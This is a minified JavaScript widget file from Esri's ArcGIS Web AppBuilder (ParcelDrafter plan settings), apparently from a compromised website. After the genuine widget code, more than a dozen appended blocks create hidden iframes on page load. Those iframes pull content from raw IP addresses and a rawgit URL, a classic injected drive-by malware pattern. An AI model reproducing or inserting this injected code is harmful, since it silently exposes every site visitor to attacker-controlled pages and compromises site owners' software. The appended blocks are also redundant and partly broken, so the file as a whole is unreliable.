// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/ParcelDrafter/PlanSettings.html":'\x3cdiv\x3e\r\n    \x3c!-- Direction or Angle Type Selector --\x3e\r\n    \x3cdiv class\x3d"esriCTFullWidth esriCTPlanSettingRow"\x3e\r\n        \x3cdiv class\x3d"esriCTDropdownLabel esriCTEllipsis" title\x3d"${nls.planSettings.directionOrAngleTypeLabel}"\x3e\r\n            ${nls.planSettings.directionOrAngleTypeLabel}\x3c/div\x3e\r\n        \x3cselect data-dojo-attach-point\x3d"directionOrAngleType" style\x3d"width: 100%" data-dojo-type\x3d"dijit/form/Select"\x3e\r\n        \x3c/select\x3e\r\n    \x3c/div\x3e\r\n    \x3c!-- Direction or Angle Units Selector --\x3e\r\n    \x3cdiv class\x3d"esriCTFullWidth esriCTPlanSettingRow"\x3e\r\n        \x3cdiv class\x3d"esriCTDropdownLabel esriCTEllipsis" title\x3d"${nls.planSettings.directionOrAngleUnitsLabel}"\x3e\r\n            ${nls.planSettings.directionOrAngleUnitsLabel}\x3c/div\x3e\r\n        \x3cselect data-dojo-attach-point\x3d"directionOrAngleUnits" style\x3d"width: 100%" data-dojo-type\x3d"dijit/form/Select"\x3e\r\n        \x3c/select\x3e\r\n    \x3c/div\x3e\r\n    \x3c!-- Distance and Length Units Selector --\x3e\r\n    \x3cdiv class\x3d"esriCTFullWidth esriCTPlanSettingRow"\x3e\r\n        \x3cdiv class\x3d"esriCTDropdownLabel esriCTEllipsis" title\x3d"${nls.planSettings.distanceAndLengthUnitsLabel}"\x3e\r\n            ${nls.planSettings.distanceAndLengthUnitsLabel}\x3c/div\x3e\r\n        \x3cselect data-dojo-attach-point\x3d"distanceAndLengthUnits" style\x3d"width: 100%" data-dojo-type\x3d"dijit/form/Select"\x3e\r\n        \x3c/select\x3e\r\n    \x3c/div\x3e\r\n    \x3c!-- Area Units Selector--\x3e\r\n    \x3cdiv class\x3d"esriCTFullWidth esriCTPlanSettingRow"\x3e\r\n        \x3cdiv class\x3d"esriCTDropdownLabel esriCTEllipsis" title\x3d"${nls.planSettings.areaUnitsLabel}"\x3e\r\n            ${nls.planSettings.areaUnitsLabel}\x3c/div\x3e\r\n        \x3cselect data-dojo-attach-point\x3d"areaUnits" style\x3d"width: 100%" data-dojo-type\x3d"dijit/form/Select"\x3e\r\n        \x3c/select\x3e\r\n    \x3c/div\x3e\r\n    \x3c!-- Circular Curve Parameters Selector --\x3e\r\n    \x3cdiv class\x3d"esriCTFullWidth esriCTPlanSettingRow"\x3e\r\n        \x3cdiv class\x3d"esriCTDropdownLabel esriCTEllipsis" title\x3d"${nls.planSettings.circularCurveParameters}"\x3e\r\n            ${nls.planSettings.circularCurveParameters}\x3c/div\x3e\r\n        \x3cselect data-dojo-attach-point\x3d"circularCurveParameters" style\x3d"width: 100%" data-dojo-type\x3d"dijit/form/Select"\x3e\r\n        \x3c/select\x3e\r\n    \x3c/div\x3e\r\n\x3c/div\x3e'}});
define("dojo/_base/declare dojo/_base/array jimu/BaseWidget dijit/_WidgetsInTemplateMixin dojo/text!./PlanSettings.html dojo/_base/lang dojo/Evented dojo/dom-class dojo/query ./utils dijit/form/Select".split(" "),function(h,k,l,m,n,e,p,c,f,g){return h([l,m,p],{baseClass:"jimu-widget-ParcelDrafter-PlanSettings",templateString:n,selectedPlanSettings:{},planSettingsOptions:e.clone(g.planSettingsOptions),constructor:function(a){e.mixin(this,a)},startup:function(){this._loadOptionsForDropDown(this.directionOrAngleType,
this.planSettingsOptions.directionOrAngleType);this._loadOptionsForDropDown(this.directionOrAngleUnits,this.planSettingsOptions.directionOrAngleUnits);this._loadOptionsForDropDown(this.distanceAndLengthUnits,this.planSettingsOptions.distanceAndLengthUnits);this._loadOptionsForDropDown(this.areaUnits,this.planSettingsOptions.areaUnits);this._loadOptionsForDropDown(this.circularCurveParameters,this.planSettingsOptions.circularCurveParameters);this.onPlansettingsChanged()},postCreate:function(){this.inherited(arguments);
this.selectedPlanSettings={};this.planSettingsOptions=e.clone(g.planSettingsOptions);c.add(this.domNode,"esriCTPlanSettingsContainer esriCTFullWidth");setTimeout(e.hitch(this,this._setBackgroundColorForDartTheme),500)},_setBackgroundColorForDartTheme:function(){var a,b,d;if("DartTheme"===this.appConfig.theme.name)for(a=f(".dijitSelect .dijitButtonContents",this.planSettingsNode),d=f(".dijitSelect .dijitArrowButton",this.planSettingsNode),b=0;b<a.length&&b<d.length;b++)c.add(a[b],"dijitButtonContentsDartTheme"),
c.add(d[b],"dijitArrowButtonDartTheme")},_loadOptionsForDropDown:function(a,b){var d=[],c;k.forEach(b,e.hitch(this,function(a){c={value:a,label:this.nls.planSettings[a]||window.jimuNls.units[a]};d.push(c)}));a.addOption(d)},_isSettingsChanged:function(){var a=!1;this.selectedPlanSettings.directionOrAngleType!==this.directionOrAngleType.get("value")?a=!0:this.selectedPlanSettings.directionOrAngleUnits!==this.directionOrAngleUnits.get("value")?a=!0:this.selectedPlanSettings.distanceAndLengthUnits!==
this.distanceAndLengthUnits.get("value")?a=!0:this.selectedPlanSettings.areaUnits!==this.areaUnits.get("value")?a=!0:this.selectedPlanSettings.circularCurveParameters!==this.circularCurveParameters.get("value")&&(a=!0);return a},onClose:function(){if(this._isSettingsChanged())this.onPlansettingsChanged()},onPlansettingsChanged:function(){this.selectedPlanSettings={directionOrAngleType:this.directionOrAngleType.get("value"),directionOrAngleUnits:this.directionOrAngleUnits.get("value"),distanceAndLengthUnits:this.distanceAndLengthUnits.get("value"),
areaUnits:this.areaUnits.get("value"),circularCurveParameters:this.circularCurveParameters.get("value")};this.emit("planSettingsChanged",this.selectedPlanSettings)}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});